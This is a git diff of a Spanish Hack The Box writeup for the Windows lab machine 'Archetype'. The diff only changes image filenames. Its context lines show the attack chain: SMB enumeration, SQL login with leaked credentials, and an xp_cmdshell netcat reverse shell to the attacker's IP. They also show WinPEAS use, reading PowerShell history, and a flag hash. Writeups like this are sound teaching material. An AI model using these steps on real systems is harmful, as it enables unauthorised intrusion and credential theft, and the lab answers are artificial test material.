@@ -28,7 +28,7 @@ Iniciamos la máquina y verificamos la conexión.
 ping -c 1 10.129.187.129
 ```
 
-<figure><img src="../../../.gitbook/assets/image (551).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (578).png" alt=""><figcaption></figcaption></figure>
 
 Observamos que tenemos conexión y que es una máquina **Windows** ya que su **ttl=127**.
 
@@ -42,7 +42,7 @@ nmap -p- --min-rate 5000 -sV 10.129.187.129
 
 para realizar un escaneo de puertos y servicios detallado en la dirección IP.
 
-<figure><img src="../../../.gitbook/assets/image (552).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (579).png" alt=""><figcaption></figcaption></figure>
 
 ### 4. 🚪 **Acceso Inicial**
 
@@ -52,7 +52,7 @@ Como se puede observar durante el escaneo, los **puertos 135** (msrpc), **139** 
  nmap -sV -sC -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 10.129.187.129
 ```
 
-<figure><img src="../../../.gitbook/assets/image (553).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (580).png" alt=""><figcaption></figcaption></figure>
 
 En el **puerto 139**, se está ejecutando el servicio de sesión **NetBIOS**. Este servicio facilita la autenticación en un grupo de trabajo o dominio de **Windows** y proporciona acceso a recursos, como archivos e impresoras.
 
@@ -66,7 +66,7 @@ Dado que el protocolo **SMB** se utiliza para compartir archivos, podemos intent
 smbmap -H 10.129.187.129 -u " " -p " "
 ```
 
-<figure><img src="../../../.gitbook/assets/image (554).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (581).png" alt=""><figcaption></figcaption></figure>
 
 Tenemos acceso de lectura en:
 
@@ -79,11 +79,11 @@ Al investigar SMB utilizando `smbclient`, conseguimos conectarnos al recurso com
 smbclient //10.129.187.129/backups
 ```
 
-<figure><img src="../../../.gitbook/assets/image (555).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (582).png" alt=""><figcaption></figcaption></figure>
 
 > Los archivos con extensión `.dtsConfig` son archivos de configuración en sintaxis XML que se utilizan para aplicar valores de propiedades a los paquetes de SQL Server Integration Services (SSIS).
 
-<figure><img src="../../../.gitbook/assets/image (556).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (583).png" alt=""><figcaption></figcaption></figure>
 
 Parece ser que nos dan unas credenciales de SQL por lo que nos intentamos conectar.
 
@@ -91,7 +91,7 @@ Parece ser que nos dan unas credenciales de SQL por lo que nos intentamos conect
 python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth ARCHETYPE/sql_svc:M3g4c0rp123@10.129.187.129
 ```
 
-<figure><img src="../../../.gitbook/assets/image (557).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (584).png" alt=""><figcaption></figcaption></figure>
 
 ¡Ahora que tenemos conexión al servidor, podemos utilizar la función `IS_SRVROLEMEMBER` para verificar si el usuario actual de SQL tiene privilegios de `sysadmin` (el nivel más alto) en el servidor SQL.
 
@@ -183,17 +183,17 @@ Seguiremos el último método: xp\_cmdshell con `nc`.
     xp_cmdshell "c:\\Users\\Public\\nc.exe -e cmd.exe 10.10.16.97 4444"
     ```
 
-<figure><img src="../../../.gitbook/assets/image (558).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (585).png" alt=""><figcaption></figcaption></figure>
 
 ### 5. 🔑 **Captura de la Flag**
 
 Una vez dentro investigamos distintos directorios para ver donde se encuentra la flag. La flag se encuentra en el directorio `/Users/sql_svc/Desktop.`
 
-<figure><img src="../../../.gitbook/assets/image (559).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (586).png" alt=""><figcaption></figcaption></figure>
 
 Esa es la user flag ahora falta la de root.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (560).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (587).png" alt=""><figcaption></figcaption></figure>
 
 **WinPEAS** es una herramienta muy útil para enumerar el sistema y encontrar debilidades. A continuación, se detalla cómo transferir y ejecutar **WinPEAS** en el sistema objetivo:
 
@@ -249,7 +249,7 @@ Observa el archivo llamado `ConsoleHost_history.txt`. A continuación, se detall
     type ConsoleHost_history.txt
     ```
 
-<figure><img src="../../../.gitbook/assets/image (562).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (589).png" alt=""><figcaption></figcaption></figure>
 
 ### 6. ❓Preguntas
 
@@ -303,4 +303,4 @@ _Contiene el historial de comandos de PowerShell, en el que se puede encontrar l
 
 b91ccec3305e98240082d4474b848528
 
-<figure><img src="../../../.gitbook/assets/image (563).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (590).png" alt=""><figcaption></figcaption></figure>
